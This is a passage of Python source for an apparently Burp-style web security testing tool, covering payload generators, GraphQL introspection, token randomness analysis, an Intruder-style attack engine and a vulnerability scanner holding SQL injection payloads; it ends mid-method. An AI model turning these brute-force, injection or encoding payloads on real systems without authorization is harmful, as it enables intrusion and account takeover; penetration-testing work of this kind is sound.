    def numbers(frm: float, to: float, step: float, fmt: str, digits: int) -> List[str]:
        out = []
        if step == 0:
            step = 1
        n = frm
        guard = 0
        while (step > 0 and n <= to) or (step < 0 and n >= to):
            if fmt == "Hexadecimal":
                out.append(format(int(n), f"0{digits}x"))
            elif fmt == "Octal":
                out.append(format(int(n), f"0{digits}o"))
            elif fmt == "Float":
                out.append(f"{n:.2f}")
            else:
                out.append(str(int(n)).zfill(digits) if digits else str(int(n)))
            n += step
            guard += 1
            if guard > 50000:
                break
        return out

    @staticmethod
    def dates(d_from: str, d_to: str, step_days: int, fmt: str) -> List[str]:
        out = []
        try:
            start = datetime.datetime.strptime(d_from, "%Y-%m-%d")
            end = datetime.datetime.strptime(d_to, "%Y-%m-%d")
        except ValueError:
            return out
        step_days = step_days or 1
        cur = start
        guard = 0
        while cur <= end:
            out.append(cur.strftime(fmt))
            cur += datetime.timedelta(days=step_days)
            guard += 1
            if guard > 20000:
                break
        return out

    @staticmethod
    def brute_forcer(charset: str, min_len: int, max_len: int, cap: int = 20000) -> List[str]:
        out = []
        charset = charset or "abcdefghijklmnopqrstuvwxyz0123456789"
        for length in range(max(1, min_len), max(min_len, max_len) + 1):
            for combo in iterproduct(charset, repeat=length):
                out.append(''.join(combo))
                if len(out) >= cap:
                    return out
        return out

    @staticmethod
    def case_modification(words: List[str], opts: Dict[str, bool]) -> List[str]:
        out = []
        for wd in words:
            if not wd:
                continue
            if opts.get("lower"):
                out.append(wd.lower())
            if opts.get("upper"):
                out.append(wd.upper())
            if opts.get("capitalize"):
                out.append(wd.capitalize())
            if opts.get("invert"):
                out.append(wd.swapcase())
            if opts.get("random"):
                out.append(''.join(c.upper() if random.random() < 0.5 else c.lower() for c in wd))
        return out

    @staticmethod
    def character_substitution(words: List[str], sub_map: Dict[str, str], cap: int = 5000) -> List[str]:
        out = []
        for wd in words:
            if not wd:
                continue
            variants = {wd}
            for orig, repl in sub_map.items():
                new_variants = set()
                for v in variants:
                    new_variants.add(v)
                    new_variants.add(v.replace(orig, repl))
                variants = new_variants
                if len(variants) > cap:
                    break
            out.extend(sorted(variants))
            if len(out) > cap:
                break
        return out[:cap]

    @staticmethod
    def illegal_unicode() -> List[str]:
        return [
            "\uFEFF", "\u202E", "\u200B", "\u0000", "\uFFFE", "\uFFFF",
            "%C0%AE%C0%AE", "%E0%80%AE", "%F0%80%80%AE",
            "\uD800", "\uDFFF", "\u00A0", "\u2028", "\u2029",
            "﷐", "＜script＞", "\u0041\u0301\u0301\u0301\u0301",
            "%c0%80", "%e0%80%80", "%f0%80%80%80",
        ]

    @staticmethod
    def character_blocks(ch: str, start: int, end: int, step: int) -> List[str]:
        out = []
        ch = (ch or "A")[:1] or "A"
        step = step or 1
        for length in range(start, end + 1, step):
            out.append(ch * length)
        return out

    @staticmethod
    def null_payloads(count: int, value: str) -> List[str]:
        return [value] * max(0, count)

    @staticmethod
    def character_frobber(base: str, alphabet: str) -> List[str]:
        out = []
        alphabet = alphabet or "abcdefghijklmnopqrstuvwxyz0123456789"
        for i in range(len(base)):
            for c in alphabet:
                if c == base[i]:
                    continue
                out.append(base[:i] + c + base[i+1:])
        return out

    @staticmethod
    def bit_flipper(base: bytes, cap: int = 4096) -> List[str]:
        out = []
        for byte_i in range(len(base)):
            for bit_i in range(8):
                mutated = bytearray(base)
                mutated[byte_i] ^= (1 << bit_i)
                out.append(mutated.hex())
                if len(out) >= cap:
                    return out
        return out

    @staticmethod
    def username_generator(firsts: List[str], lasts: List[str], cap: int = 2000) -> List[str]:
        out = []
        for f in firsts:
            f = f.strip()
            if not f:
                continue
            for l in (lasts or [""]):
                l = l.strip()
                patterns = [f]
                if l:
                    patterns += [
                        f"{f}{l}", f"{f}.{l}", f"{f}_{l}", f"{f[0]}{l}",
                        f"{l}{f}", f"{l}.{f}", f"{f}{l[0]}",
                    ]
                out.extend(p.lower() for p in patterns)
                if len(out) >= cap:
                    return out[:cap]
        return out[:cap]

    @staticmethod
    def ecb_block_shuffler(data: bytes, block_size: int, cap: int = 200) -> List[str]:
        blocks = [data[i:i+block_size] for i in range(0, len(data), block_size)]
        out = []
        n = len(blocks)
        for i in range(n):
            for j in range(i + 1, n):
                swapped = blocks[:]
                swapped[i], swapped[j] = swapped[j], swapped[i]
                out.append(b''.join(swapped).hex())
                if len(out) >= cap:
                    return out
        return out

    @staticmethod
    def custom_iterator(groups: List[List[str]], separator: str) -> List[str]:
        groups = [g for g in groups if g]
        if not groups:
            return []
        out = []
        for combo in iterproduct(*groups):
            out.append(separator.join(combo))
            if len(out) >= 20000:
                break
        return out


# ========== GRAPHQL (InQL-style introspection & query generation) ==========
# The standard GraphQL introspection query, as defined by the GraphQL
# specification itself (spec.graphql.org) — every GraphQL client/tool uses
# this exact shape (GraphiQL, Apollo, Postman, InQL, Burp's own support).
GRAPHQL_INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType { kind name ofType { kind name } }
          }
        }
      }
    }
  }
}
""".strip()


class GraphQLSchema:
    """Parses a GraphQL introspection response into a lookup table, and
    generates ready-to-send example queries/mutations from it — the core
    idea behind InQL's query-template generation."""

    SCALARS = {"String", "Int", "Float", "Boolean", "ID"}

    def __init__(self, introspection_json: dict):
        schema = introspection_json.get('data', {}).get('__schema', {})
        self.query_type = (schema.get('queryType') or {}).get('name')
        self.mutation_type = (schema.get('mutationType') or {}).get('name')
        self.subscription_type = (schema.get('subscriptionType') or {}).get('name')
        self.types: Dict[str, dict] = {t['name']: t for t in schema.get('types', []) if t.get('name')}

    def operations(self, root_type_name: Optional[str]) -> List[dict]:
        if not root_type_name or root_type_name not in self.types:
            return []
        return self.types[root_type_name].get('fields') or []

    def _unwrap(self, type_ref: dict) -> Tuple[str, dict]:
        """Strip NON_NULL/LIST wrappers, returning (kind, innermost_type_ref)."""
        t = type_ref
        while t and t.get('ofType'):
            t = t['ofType']
        return (t.get('kind', ''), t) if t else ('', {})

    def type_name(self, type_ref: dict) -> str:
        """Public helper: the innermost scalar/object type name, wrappers stripped."""
        return self._unwrap(type_ref)[1].get('name', '') or ''

    def _example_scalar(self, name: str) -> str:
        return {"String": '"example"', "Int": "1", "Float": "1.0",
                "Boolean": "true", "ID": '"1"'}.get(name, '"value"')

    def _gen_args(self, args: List[dict]) -> str:
        if not args:
            return ""
        parts = []
        for a in args:
            _, inner = self._unwrap(a.get('type', {}))
            name = inner.get('name', 'String')
            if name in self.SCALARS or not name:
                val = self._example_scalar(name or 'String')
            elif name in self.types and self.types[name].get('kind') == 'ENUM':
                values = self.types[name].get('enumValues') or []
                val = values[0]['name'] if values else 'VALUE'
            else:
                val = self._example_scalar('String')
            parts.append(f"{a['name']}: {val}")
        return "(" + ", ".join(parts) + ")"

    def _gen_selection(self, type_ref: dict, depth: int, seen: set) -> str:
        _, inner = self._unwrap(type_ref)
        type_name = inner.get('name', '')
        if not type_name or type_name in self.SCALARS or depth <= 0 or type_name in seen:
            return ""
        t = self.types.get(type_name)
        if not t or not t.get('fields'):
            return ""
        seen = seen | {type_name}
        lines = []
        for f in t['fields'][:8]:   # cap fan-out so generated queries stay readable
            _, f_inner = self._unwrap(f.get('type', {}))
            f_type_name = f_inner.get('name', '')
            f_type_kind = self.types.get(f_type_name, {}).get('kind', '') if f_type_name else ''
            # Scalars AND enums are leaf values — always include them bare.
            # Only OBJECT/INTERFACE/UNION types get a nested selection set,
            # and only if that recursion actually produces something (an
            # empty result means a childless/already-visited type, in which
            # case the field is skipped rather than emitted as invalid `{}`).
            if not f_type_name or f_type_name in self.SCALARS or f_type_kind == 'ENUM':
                lines.append(f"    {f['name']}")
            else:
                sub = self._gen_selection(f.get('type', {}), depth - 1, seen)
                if sub:
                    lines.append(f"    {f['name']} {{{sub}\n    }}")
        if not lines:
            return ""
        return "\n" + "\n".join(lines)

    def generate_query(self, op_kind: str, field: dict, depth: int = 2) -> str:
        """op_kind: 'query' | 'mutation' | 'subscription'"""
        args_str = self._gen_args(field.get('args') or [])
        return_type_name = self.type_name(field.get('type', {}))
        return_kind = self.types.get(return_type_name, {}).get('kind', '') if return_type_name else ''
        # Scalars and enums are leaf values in GraphQL — a selection set on
        # them (e.g. `ping { __typename }`) is a syntax error, not just
        # unnecessary. Only OBJECT/INTERFACE/UNION types may have one.
        if not return_type_name or return_type_name in self.SCALARS or return_kind == 'ENUM':
            return f"{op_kind} {{\n  {field['name']}{args_str}\n}}"
        sel = self._gen_selection(field.get('type', {}), depth, set())
        if not sel:
            sel = "\n    __typename"
        return f"{op_kind} {{\n  {field['name']}{args_str} {{{sel}\n  }}\n}}"


# ========== SCOPE MANAGER ==========
class ScopeManager:
    """Track in-scope / out-of-scope targets."""
    def __init__(self):
        self._rules: List[dict] = []   # {pattern, include, regex}

    def add(self, pattern: str, include: bool = True, is_regex: bool = False):
        self._rules.append({"pattern": pattern, "include": include, "regex": is_regex})

    def remove(self, idx: int):
        if 0 <= idx < len(self._rules):
            self._rules.pop(idx)

    def in_scope(self, url: str) -> bool:
        if not self._rules:
            return True
        result = False
        for r in self._rules:
            try:
                matched = bool(re.search(r['pattern'], url, re.I)) if r['regex'] \
                          else r['pattern'].lower() in url.lower()
            except Exception:
                matched = False
            if matched:
                result = r['include']
        return result

    def all_rules(self) -> List[dict]:
        return list(self._rules)


# ========== SESSION MANAGER ==========
class SessionManager:
    """Store named sessions (cookies + headers) for replay."""
    def __init__(self):
        self._sessions: Dict[str, dict] = {}
        self._active: Optional[str] = None

    def save(self, name: str, cookies: str, headers: str):
        self._sessions[name] = {"cookies": cookies, "headers": headers}

    def load(self, name: str) -> Optional[dict]:
        return self._sessions.get(name)

    def delete(self, name: str):
        self._sessions.pop(name, None)
        if self._active == name:
            self._active = None

    def set_active(self, name: Optional[str]):
        self._active = name

    def active(self) -> Optional[dict]:
        if self._active:
            return self._sessions.get(self._active)
        return None

    def names(self) -> List[str]:
        return list(self._sessions.keys())


# ========== SEQUENCER (Token Analysis) ==========
class Sequencer(QThread):
    """Statistical randomness analysis for session tokens / CSRF tokens."""
    sample_ready = pyqtSignal(int, str)   # (count, token)
    analysis_done = pyqtSignal(dict)
    error = pyqtSignal(str)

    def __init__(self, url: str, param: str, method: str, count: int,
                 extra_headers: dict, post_body: str):
        super().__init__()
        self.url = url
        self.param = param
        self.method = method.upper()
        self.count = count
        self.extra_headers = extra_headers
        self.post_body = post_body
        self._running = True

    def stop(self):
        self._running = False

    def run(self):
        if not HAS_REQUESTS:
            self.error.emit("pip install requests")
            return
        tokens = []
        for i in range(self.count):
            if not self._running:
                break
            try:
                h = {'User-Agent': 'Kingception/1.0'}
                h.update(self.extra_headers)
                r = requests.request(
                    self.method, self.url, headers=h,
                    data=self.post_body or None,
                    verify=False, timeout=10, allow_redirects=False)
                # Try to extract param from response body, headers, or cookies
                tok = None
                if self.param:
                    m = re.search(rf'{re.escape(self.param)}[=:\"\']?\s*([A-Za-z0-9+/=_\-\.%]{8,})',
                                  r.text + str(dict(r.headers)) + str(dict(r.cookies)))
                    if m:
                        tok = m.group(1)
                if not tok:
                    # Try cookies
                    for k, v in r.cookies.items():
                        if 'session' in k.lower() or 'token' in k.lower() or 'csrf' in k.lower():
                            tok = v
                            break
                if not tok:
                    tok = r.headers.get('Set-Cookie', '')[:80]
                if tok:
                    tokens.append(tok)
                    self.sample_ready.emit(i + 1, tok)
            except Exception as e:
                self.error.emit(str(e))
                break

        if len(tokens) < 2:
            self.error.emit(f"Only {len(tokens)} token(s) collected — need at least 2")
            return

        result = self._analyse(tokens)
        self.analysis_done.emit(result)

    def _analyse(self, tokens: List[str]) -> dict:
        """FIPS 140-2 / NIST SP800-22 inspired bit-level analysis."""
        # Convert tokens to bit strings
        bits = []
        for t in tokens:
            try:
                raw = __import__('base64').b64decode(t + '==')
            except Exception:
                raw = t.encode('utf-8', 'replace')
            for byte in raw:
                for bit_pos in range(7, -1, -1):
                    bits.append((byte >> bit_pos) & 1)

        n = len(bits)
        if n < 8:
            return {"error": "Not enough bits"}

        # Monobit test (FIPS 140-2 Test 1)
        ones = sum(bits)
        zeros = n - ones
        monobit_pass = 9654 < ones < 10346 if n == 20000 else abs(ones - zeros) < n * 0.1

        # Entropy estimate (Shannon)
        try:
            from math import log2
            p1 = ones / n; p0 = zeros / n
            entropy = -(p1 * log2(p1) if p1 > 0 else 0) - (p0 * log2(p0) if p0 > 0 else 0)
        except Exception:
            entropy = 0

        # Runs test
        runs = 1
        for i in range(1, len(bits)):
            if bits[i] != bits[i-1]:
                runs += 1
        exp_runs = (2 * ones * zeros) / n + 1 if n > 0 else 0
        runs_pass = abs(runs - exp_runs) < 3 * (n ** 0.5)

        # Token length variance
        lengths = [len(t) for t in tokens]
        avg_len = sum(lengths) / len(lengths)
        unique_pct = len(set(tokens)) / len(tokens) * 100

        # Char frequency analysis
        all_chars = ''.join(tokens)
        freq = Counter(all_chars)
        char_entropy = 0
        for c, cnt in freq.items():
            p = cnt / len(all_chars)
            char_entropy -= p * __import__('math').log2(p)

        # Similarity — how many tokens share a common prefix
        prefix_len = 0
        if len(tokens) >= 2:
            while prefix_len < min(len(tokens[0]), len(tokens[1])) and \
                  all(t[:prefix_len+1] == tokens[0][:prefix_len+1] for t in tokens[:20]):
                prefix_len += 1

        # Overall grade
        score = 0
        if monobit_pass: score += 25
        if runs_pass: score += 25
        if entropy > 0.95: score += 25
        if unique_pct >= 100: score += 25
        grade = ("A — Excellent" if score == 100 else
                 "B — Good" if score >= 75 else
                 "C — Fair" if score >= 50 else
                 "D — Poor" if score >= 25 else "F — Very Weak")

        return {
            "count": len(tokens), "bits": n,
            "monobit_pass": monobit_pass, "ones": ones, "zeros": zeros,
            "entropy_bits": round(entropy, 4),
            "char_entropy": round(char_entropy, 4),
            "runs": runs, "expected_runs": round(exp_runs, 1), "runs_pass": runs_pass,
            "avg_length": round(avg_len, 1), "unique_pct": round(unique_pct, 2),
            "common_prefix_len": prefix_len,
            "score": score, "grade": grade,
            "sample_tokens": tokens[:5],
        }


# ========== INTRUDER ==========
class IntruderAttack(QThread):
    result   = pyqtSignal(dict)
    progress = pyqtSignal(int, int)
    finished = pyqtSignal(str)

    SNIPER       = "Sniper"
    BATTERING    = "Battering Ram"
    PITCHFORK    = "Pitchfork"
    CLUSTER_BOMB = "Cluster Bomb"
    # Capture group = the original/base value inside the markers, so any
    # position NOT being targeted on a given request can keep its real value
    # instead of going blank — this is what makes Sniper/Pitchfork correct.
    MARKER_RE = re.compile(r'§([^§]*)§')

    def __init__(self, mode, url, method, headers_text, template,
                 payload_sets: List[dict],   # [{"values":[...], "rules":[...]}, ...] one per position
                 concurrency=10, delay_ms=0, delay_jitter_ms=0,
                 retries=0, retry_pause_ms=500,
                 update_cl=True, set_connection=False,
                 throttle_codes=None, throttle_extra_ms=2000,
                 store_responses=True, store_full_body=True,
                 baseline=False,
                 grep_pattern="", grep_regex=False,
                 encode_chars=""):
        super().__init__()
        self.mode = mode
        self.url = url
        self.method = method
        self.headers_text = headers_text
        self.template = template
        self.payload_sets = payload_sets or []
        self.concurrency = max(1, concurrency)
        self.delay_ms = delay_ms
        self.delay_jitter_ms = delay_jitter_ms
        self.retries = retries
        self.retry_pause_ms = retry_pause_ms
        self.update_cl = update_cl
        self.set_connection = set_connection
        self.throttle_codes = set(throttle_codes or [])
        self.throttle_extra_ms = throttle_extra_ms
        self.store_responses = store_responses
        self.store_full_body = store_full_body
        self.baseline = baseline
        self.grep_pattern = grep_pattern
        self.grep_regex = grep_regex
        self.encode_chars = encode_chars
        self.running = False

    def _total_markers(self) -> int:
        """Count § positions across BOTH headers and body templates."""
        return (len(self.MARKER_RE.findall(self.headers_text)) +
                len(self.MARKER_RE.findall(self.template)))

    @staticmethod
    def apply_rules(value: str, rules: List[dict]) -> str:
        """Apply payload-processing rules to a single payload value, in order."""
        for rule in rules or []:
            t = rule.get('type', '')
            try:
                if t == 'prefix':
                    value = rule.get('arg', '') + value
                elif t == 'suffix':
                    value = value + rule.get('arg', '')
                elif t == 'upper':
                    value = value.upper()
                elif t == 'lower':
                    value = value.lower()
                elif t == 'urlencode':
                    value = url_quote(value, safe='')
                elif t == 'urldecode':
                    value = url_unquote(value)
                elif t == 'b64encode':
                    value = base64.b64encode(value.encode('utf-8', 'replace')).decode()
                elif t == 'b64decode':
                    value = base64.b64decode(value + '=' * (-len(value) % 4)).decode('utf-8', 'replace')
                elif t == 'md5':
                    value = hashlib.md5(value.encode('utf-8', 'replace')).hexdigest()
                elif t == 'sha256':
                    value = hashlib.sha256(value.encode('utf-8', 'replace')).hexdigest()
                elif t == 'replace':
                    value = re.sub(rule.get('pattern', ''), rule.get('repl', ''), value)
            except Exception:
                pass  # malformed rule/value — leave value as-is rather than crash the attack
        return value

    def _apply_encoding(self, value: str) -> str:
        if not self.encode_chars:
            return value
        out = []
        for ch in value:
            out.append(f"%{ord(ch):02X}" if ch in self.encode_chars else ch)
        return ''.join(out)

    def _processed_values(self, set_idx: int) -> List[str]:
        s = self.payload_sets[set_idx] if set_idx < len(self.payload_sets) else {"values": [], "rules": []}
        return [self._apply_encoding(self.apply_rules(v, s.get('rules'))) for v in s.get('values', [])]

    def _build_jobs(self) -> List[dict]:
        """Return one dict per request: {position_index: substituted_value}.
        Positions not present in the dict keep their original marked value."""
        n_pos = max(self._total_markers(), 1)
        if not self.payload_sets or not self.payload_sets[0].get('values'):
            return []

        if self.mode == self.SNIPER:
            # Burp semantics: ONE payload set, applied to each position IN TURN
            # (not simultaneously) — every other position keeps its base value.
            vals = self._processed_values(0)
            return [{p: v} for p in range(n_pos) for v in vals]

        if self.mode == self.BATTERING:
            # ONE payload set, same value into EVERY position at once.
            vals = self._processed_values(0)
            return [{p: v for p in range(n_pos)} for v in vals]

        if self.mode == self.PITCHFORK:
            # One list per position, marched in lockstep; stops at the shortest.
            processed = [self._processed_values(i) for i in range(min(len(self.payload_sets), n_pos))]
            rows = list(zip(*processed)) if processed else []
            return [{i: row[i] for i in range(len(row))} for row in rows]

        if self.mode == self.CLUSTER_BOMB:
            # One list per position, full cartesian product.
            processed = [self._processed_values(i) for i in range(min(len(self.payload_sets), n_pos))]
            combos = list(iterproduct(*processed)) if processed else []
            return [{i: combo[i] for i in range(len(combo))} for combo in combos]

        return []

    def _apply_markers(self, text: str, replacements: dict, idx_ref: list) -> str:
        def repl(m):
            i = idx_ref[0]
            idx_ref[0] += 1
            return replacements[i] if i in replacements else m.group(1)
        return self.MARKER_RE.sub(repl, text)

    def _build_request(self, replacements: dict) -> Tuple[str, str]:
        idx_ref = [0]
        headers_out = self._apply_markers(self.headers_text, replacements, idx_ref)
        body_out = self._apply_markers(self.template, replacements, idx_ref)
        return headers_out, body_out

    def run(self):
        self.running = True
        jobs = self._build_jobs()
        done = 0

        if self.baseline and HAS_REQUESTS:
            base = self._send(-1, {})
            if base:
                base['is_baseline'] = True
                self.result.emit(base)

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.concurrency) as ex:
            futs = [ex.submit(self._send, i, repl) for i, repl in enumerate(jobs)]
            for f in concurrent.futures.as_completed(futs):
                if not self.running:
                    break
                done += 1
                self.progress.emit(done, len(jobs))
                r = f.result()
                if r:
                    self.result.emit(r)
        self.finished.emit(f"Attack complete — {done}/{len(jobs)} requests")

    def _send(self, idx: int, replacements: dict) -> Optional[dict]:
        if not HAS_REQUESTS:
            return None
        if self.delay_ms or self.delay_jitter_ms:
            d = self.delay_ms + (random.randint(0, self.delay_jitter_ms) if self.delay_jitter_ms else 0)
            if d:
                time.sleep(d / 1000)

        headers_str, body_str = self._build_request(replacements)
        headers = {}
        for line in headers_str.strip().split('\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip()] = v.strip()
        if self.set_connection:
            headers['Connection'] = 'close'
        if self.update_cl and body_str.strip():
            headers['Content-Length'] = str(len(body_str.encode('utf-8', 'replace')))

        attempt = 0
        while True:
            try:
                start = time.time()
                r = requests.request(self.method, self.url, headers=headers,
                                     data=body_str.encode('utf-8', 'replace') if body_str.strip() else None,
                                     verify=False, timeout=20, allow_redirects=False)
                dur = time.time() - start
                if self.throttle_codes and r.status_code in self.throttle_codes and self.throttle_extra_ms:
                    time.sleep(self.throttle_extra_ms / 1000)
                grep_hit = False
                if self.grep_pattern:
                    try:
                        grep_hit = (bool(re.search(self.grep_pattern, r.text)) if self.grep_regex
                                    else self.grep_pattern in r.text)
                    except Exception:
                        grep_hit = False
                resp_text = r.text if self.store_responses else ''
                if resp_text and not self.store_full_body:
                    resp_text = resp_text[:5000]
                return dict(idx=idx, replacements=replacements, status=r.status_code,
                            length=len(r.content), dur=round(dur, 3),
                            response=resp_text, headers=dict(r.headers),
                            grep_hit=grep_hit, error='')
            except Exception as e:
                attempt += 1
                if attempt <= self.retries:
                    if self.retry_pause_ms:
                        time.sleep(self.retry_pause_ms / 1000)
                    continue
                return dict(idx=idx, replacements=replacements, status=0, length=0, dur=0,
                            response='', headers={}, grep_hit=False, error=str(e))

    def stop(self):
        self.running = False


class _NumericTableItem(QTableWidgetItem):
    """QTableWidgetItem that sorts numerically instead of alphabetically —
    so a Status/Length/Time column sorts 9 < 10 instead of '10' < '9'."""
    def __lt__(self, other):
        try:
            return float(self.text()) < float(other.text())
        except (ValueError, TypeError):
            return super().__lt__(other)


class IntruderMarkerHighlighter(QSyntaxHighlighter):
    """Highlights §...§ position markers in the Intruder Headers/Body editors
    with a colored, bold background — mirroring Burp's marker highlighting so
    positions are easy to spot at a glance."""
    def highlightBlock(self, text):
        fmt = QTextCharFormat()
        fmt.setBackground(QBrush(QColor("#3b82f64d")))
        fmt.setForeground(QBrush(QColor("#60a5fa")))
        fmt.setFontWeight(QFont.Weight.Bold)
        for m in re.finditer(r'§[^§]*§', text):
            self.setFormat(m.start(), m.end() - m.start(), fmt)

# ========== SCANNER ==========
class Scanner(QThread):
    finding  = pyqtSignal(dict)
    progress = pyqtSignal(int, str)
    log      = pyqtSignal(str)
    done     = pyqtSignal(int)

    FULL_CHECKS  = ["Security Headers","SSL/TLS","CORS","Open Redirect",
                    "SQL Injection","XSS Reflected","SSTI","Command Injection",
                    "Path Traversal","XXE","Clickjacking","SSRF Probe","JWT Issues",
                    "Sensitive File Exposure","HTTP Methods"]
    QUICK_CHECKS = ["Security Headers","SSL/TLS","CORS","Clickjacking"]
    INJECT_CHECKS= ["SQL Injection","XSS Reflected","SSTI","Command Injection","Path Traversal","XXE"]
    AUTH_CHECKS  = ["JWT Issues","CORS","Security Headers"]

    def __init__(self, target: str, db: 'DB', mode: str = "Full Scan",
                 passive_msgs: list = None):
        super().__init__()
        self.target       = target.rstrip('/')
        self.db           = db
        self.mode         = mode
        self.passive_msgs = passive_msgs or []
        self.running      = False

    def run(self):
        self.running = True
        if self.mode == "Passive (Traffic Only)":
            self._passive_scan()
            return
        names = (self.QUICK_CHECKS   if "Quick"     in self.mode else
                 self.INJECT_CHECKS  if "Injection" in self.mode else
                 self.AUTH_CHECKS    if "Auth"      in self.mode else
                 self.FULL_CHECKS)
        check_map = {
            "Security Headers":      ("medium",   self._headers),
            "SQL Injection":         ("high",     self._sqli),
            "XSS Reflected":         ("high",     self._xss),
            "Path Traversal":        ("high",     self._lfi),
            "CORS":                  ("medium",   self._cors),
            "Open Redirect":         ("medium",   self._redirect),
            "SSTI":                  ("critical", self._ssti),
            "Command Injection":     ("critical", self._cmdi),
            "SSL/TLS":               ("medium",   self._tls),
            "XXE":                   ("critical", self._xxe),
            "Clickjacking":          ("medium",   self._clickjack),
            "SSRF Probe":            ("high",     self._ssrf),
            "JWT Issues":            ("high",     self._jwt_check),
            "Sensitive File Exposure":("medium",  self._sensitive_files),
            "HTTP Methods":          ("low",      self._http_methods),
        }
        found = 0
        total = len(names)
        for i, name in enumerate(names):
            if not self.running:
                break
            self.progress.emit(int((i + 1) / total * 100), f"[→] {name}…")
            self.log.emit(f"[→] {name}")
            try:
                fn = check_map[name][1]
                for r in fn():
                    found += 1
                    self.finding.emit(r)
                    self.db.save_scan(r)
            except Exception as e:
                self.log.emit(f"[!] {name}: {e}")
        self.done.emit(found)

    def _passive_scan(self):
        """Analyse already-captured proxy traffic for security issues."""
        found = 0
        msgs  = self.passive_msgs
        total = max(len(msgs), 1)
        for i, msg in enumerate(msgs):
            if not self.running:
                break
            self.progress.emit(int((i + 1) / total * 100), f"Analysing message {i+1}/{total}")
            url   = msg.get("url", "")
            rh    = msg.get("resp_headers") or {}
            hl    = {k.lower(): v for k, v in rh.items()}
            # Missing security headers
            for hdr, name, cwe in [
                ("strict-transport-security", "Missing HSTS",              "CWE-311"),
                ("content-security-policy",   "Missing CSP",               "CWE-693"),
                ("x-frame-options",           "Missing X-Frame-Options",   "CWE-1021"),
                ("x-content-type-options",    "Missing X-Content-Type-Options","CWE-16"),
            ]:
                if hdr not in hl:
                    r = self._mk(name,"low",f"Header '{hdr}' absent on {url}",
                                 f"GET {url}","","Add security header","CWE-16",2.0,"passive")
                    r["cwe"] = cwe; self.finding.emit(r); self.db.save_scan(r); found += 1
            # Insecure cookies
            sc = hl.get("set-cookie","")
            if sc:
                for flag, vuln, cwe in [("httponly","Missing HttpOnly Cookie","CWE-1004"),
                                          ("secure","Missing Secure Cookie Flag","CWE-614")]:
                    if flag not in sc.lower():
                        r = self._mk(vuln,"medium",f"Cookie missing {flag}: {sc[:60]}",
                                     f"GET {url}",f"Set-Cookie: {sc[:80]}",
                                     f"Add {flag} flag to Set-Cookie",cwe,4.3,"passive")
                        self.finding.emit(r); self.db.save_scan(r); found += 1
            # CORS
            acao = hl.get("access-control-allow-origin","")
            if acao == "*" or "evil" in acao:
                r = self._mk("Overly Permissive CORS","medium",f"ACAO: {acao}",
                             f"GET {url}",f"Access-Control-Allow-Origin: {acao}",
                             "Restrict CORS to trusted origins","CWE-346",6.5,"passive")
                self.finding.emit(r); self.db.save_scan(r); found += 1
            # JWT in request
            rqh = msg.get("req_headers") or {}
            auth = rqh.get("Authorization","")
            if auth.startswith("Bearer eyJ"):
                token = auth.split("Bearer ",1)[1].strip()
                parts = token.split(".")
                if len(parts)==3:
                    try:
                        import base64 as _b64
                        hdr_raw = _b64.b64decode(parts[0]+"==").decode("utf-8","replace")
                        if '"none"' in hdr_raw.lower() or '"alg":"none"' in hdr_raw.lower():
                            r = self._mk("JWT alg:none","critical","JWT with alg=none detected",
                                         f"Authorization: Bearer {token[:40]}...",hdr_raw[:200],
                                         "Reject JWTs with alg=none; enforce HS256/RS256","CWE-347",9.1,"passive")
                            self.finding.emit(r); self.db.save_scan(r); found += 1
                    except Exception:
                        pass
        self.log.emit(f"Passive scan complete: {len(msgs)} messages analysed")
        self.done.emit(found)

    def stop(self): self.running = False

    def _req(self, url, method='GET', data=None, headers=None, timeout=8):
        if not HAS_REQUESTS:
            return 0, "", {}
        try:
            h = {'User-Agent':'Kingception/1.0-Scanner'}
            if headers: h.update(headers)
            r = requests.request(method,url,headers=h,data=data,
                                 timeout=timeout,verify=False,allow_redirects=False)
            return r.status_code, r.text, dict(r.headers)
        except Exception:
            return 0, "", {}

    def _mk(self, vtype, sev, desc, req_ev, resp_ev, fix, cwe, cvss=5.0, conf="medium"):
        return dict(id=str(uuid.uuid4()), url=self.target, vuln_type=vtype, severity=sev,
                    desc=desc, req_ev=req_ev, resp_ev=str(resp_ev)[:800], fix=fix,
                    cwe=cwe, cvss=cvss, ts=time.time(), confidence=conf)

    def _headers(self):
        st, _, h = self._req(self.target)
        if st == 0: return []
        hl = {k.lower():v for k,v in h.items()}; res=[]
        for hdr,name,sev,cwe,cvss in [
            ('strict-transport-security','Missing HSTS','medium','CWE-311',5.9),
            ('content-security-policy','Missing Content-Security-Policy','medium','CWE-693',5.4),
            ('x-frame-options','Missing X-Frame-Options','medium','CWE-1021',5.4),
            ('x-content-type-options','Missing X-Content-Type-Options','low','CWE-16',3.7),
            ('permissions-policy','Missing Permissions-Policy','low','CWE-16',3.1),
            ('referrer-policy','Missing Referrer-Policy','low','CWE-116',3.1),
        ]:
            if hdr not in hl:
                res.append(self._mk(name,sev,f"Header '{hdr}' not present in response",
                                    f"GET {self.target} HTTP/1.1",
                                    f"Present headers: {list(hl.keys())[:8]}",
                                    f"Add '{hdr}' to every HTTP response",cwe,cvss))
        srv = hl.get('server','')
        if re.search(r'\d+\.\d+',srv):
            res.append(self._mk("Server Version Disclosure","low",
                                f"Server header reveals version: {srv}",
                                f"GET {self.target} HTTP/1.1",f"Server: {srv}",
                                "Remove or genericise Server header in config","CWE-200",3.5))
        xpb = hl.get('x-powered-by','')
        if xpb:
            res.append(self._mk("Technology Disclosure via X-Powered-By","low",
                                f"X-Powered-By: {xpb}",
                                f"GET {self.target} HTTP/1.1",f"X-Powered-By: {xpb}",
                                "Remove X-Powered-By header from server config","CWE-200",3.1))
        return res

    def _sqli(self):
        payloads=[("'","Error-based"),("' OR '1'='1'--","Auth bypass"),("' AND SLEEP(3)--","Time-based")]
        errors=['sql syntax','mysql_fetch','ora-','pg_query','sqlite','jdbc','syntax error','unclosed quotation']
        for p,ptype in payloads:
            if not self.running: break
